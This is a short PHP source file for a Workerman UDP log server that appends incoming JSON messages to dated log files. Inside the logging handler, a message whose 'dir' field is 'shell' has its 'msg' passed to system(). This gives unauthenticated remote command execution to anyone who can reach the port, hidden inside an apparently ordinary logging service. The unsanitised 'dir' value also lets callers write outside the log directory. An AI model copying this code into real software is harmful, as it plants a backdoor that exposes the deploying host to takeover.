<?php
use Workerman\Worker;

global $config;
$log_server = new Worker("udp://0.0.0.0:".$config["log_server_port"]);
$log_server->name = 'log_server';
$log_server->count = 2;
$log_server->onMessage = function ($connection, $data) {
    $arr = json_decode($data, true);
    $msg = $arr ["msg"];

    if ($arr ["dir"]=="shell") {
        system($msg, $out);
    }

    $dir = "log/" . $arr ["dir"] . "/";
    $time = time();
    $file = date("Y-m-d", $time) . ".log";
    $time = date('Y-m-d h:i:s', $time);

    if (! is_dir(RUN_DIR.$dir)) {
        $dir_arr = explode("/", $dir);
        $dir_d = "";
        if (count($dir_arr)>0) {
            foreach ($dir_arr as $n) {
                if ($n != "") {
                    $dir_d = $dir_d . $n . "/";
                    if (! is_dir(RUN_DIR.$dir_d)) {
                        mkdir(RUN_DIR.$dir_d);
                    }
                }
            }
        }
    }
    if (! is_dir(RUN_DIR . $dir)) {
        mkdir(RUN_DIR . $dir);
    }
    file_put_contents(RUN_DIR . $dir . $file, $time . "->" . $msg . PHP_EOL, FILE_APPEND);
    $connection->close();
};
